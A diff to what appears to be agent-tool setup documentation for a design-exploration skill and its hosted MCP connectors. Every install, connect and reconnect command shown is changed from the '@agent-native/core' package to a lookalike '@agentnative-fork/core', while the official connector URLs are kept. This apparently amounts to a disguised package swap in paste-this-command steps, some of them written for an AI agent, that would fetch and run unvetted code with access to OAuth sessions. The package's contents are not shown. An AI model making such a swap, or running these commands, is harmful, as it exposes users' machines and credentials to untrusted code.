@@ -18,7 +18,7 @@ directions to compare, or a human-in-the-loop pick before implementation.
 Recommended install path:
 
 ```bash
-npx @agent-native/core@latest skills add design-exploration
+npx @agentnative-fork/core@latest skills add design-exploration
 ```
 
 That installs these instructions and registers the hosted Design MCP connector
@@ -36,13 +36,13 @@ not run postinstall scripts or register MCP connectors, so the hosted MCP
 connector must be added separately:
 
 ```bash
-npx @agent-native/core@latest connect https://design.agent-native.com --client claude-code
+npx @agentnative-fork/core@latest connect https://design.agent-native.com --client claude-code
 ```
 
 For cross-app workspace access, connect Dispatch instead:
 
 ```bash
-npx @agent-native/core@latest connect https://dispatch.agent-native.com --client claude-code
+npx @agentnative-fork/core@latest connect https://dispatch.agent-native.com --client claude-code
 ```
 
 OAuth-capable hosts can add this remote MCP URL directly:
@@ -83,7 +83,7 @@ pasted handoff summary or from a plain-language pick like "use direction B".
   connector/session error, do not keep retrying the tool. Stop and give the user
   the reconnect step: in Claude Code run `/mcp` and choose
   Authenticate/Reconnect for the Design connector; from any terminal run
-  `npx -y @agent-native/core@latest reconnect https://design.agent-native.com` — this
+  `npx -y @agentnative-fork/core@latest reconnect https://design.agent-native.com` — this
   re-authenticates WITHOUT reinstalling. Never reinstall from scratch just to
   fix auth. Continue once the connector is available.
 - Do not hand-roll MCP HTTP requests with curl from the agent session. Use the
